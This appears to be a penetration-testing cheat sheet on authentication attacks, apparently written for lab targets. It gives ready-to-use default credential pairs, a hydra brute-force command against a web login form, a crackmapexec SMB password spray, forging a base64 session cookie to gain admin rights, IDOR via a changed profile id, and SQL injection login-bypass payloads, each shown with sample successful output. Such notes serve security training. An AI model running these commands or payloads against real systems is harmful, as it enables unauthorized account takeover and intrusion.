# AUTHENTICATION ATTACKS

### Default credentials

```bash
admin:admin, admin:password, root:root
Google: '<application> default credentials'
```

> Try known defaults first

**Why:** Always the first thing to try

<details>
<summary>Example Output</summary>

```
admin:admin -> 'Login successful'
OR: admin:password -> 'Welcome, Administrator'
(Always try these FIRST before brute forcing)
```
</details>

---

### Brute force login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'
```

> HTTP form brute force

**Why:** Get exact form fields from Burp

<details>
<summary>Example Output</summary>

```
hydra -l admin -P rockyou.txt 10.10.10.5 pop3
[110][pop3] login: admin password: welcome1
(Crack mail credentials)
```
</details>

---

### Password spray

```bash
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success
```

> One password, many users

**Why:** Avoids lockouts

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u users.txt -p 'Password1'
[-] corp\admin:Password1
[-] corp\john:Password1
[+] corp\jane:Password1
(One hit across many users)
```
</details>

---

### Session hijacking

```bash
Check cookies for session tokens, try to decode/forge
```

> JWT, base64 encoded tokens

**Why:** Weak session management

<details>
<summary>Example Output</summary>

```
Cookie: session=eyJhZG1pbiI6ZmFsc2V9
base64 decode: {"admin":false}
Change to: {"admin":true}
base64 encode: eyJhZG1pbiI6dHJ1ZX0=
Set cookie and refresh -> Admin access!
```
</details>

---

### Registration / password reset

```bash
Register a new account, look for IDOR or priv escalation
```

> Create test@test.com

**Why:** Sometimes leads to admin access

<details>
<summary>Example Output</summary>

```
Register: testuser@test.com
Login -> see profile page
Change URL: /profile?id=1 (was id=5)
Now viewing admin's profile = IDOR
OR: Reset admin password via manipulated token
```
</details>

---

### SQL injection on login

```bash
admin' OR 1=1-- -
admin'-- -
```

> Bypass authentication

**Why:** Classic SQLi login bypass

<details>
<summary>Example Output</summary>

```
Username: admin'-- -
Password: anything

Result: Logged in as admin
(Authentication bypassed via SQLi)
```
</details>

---
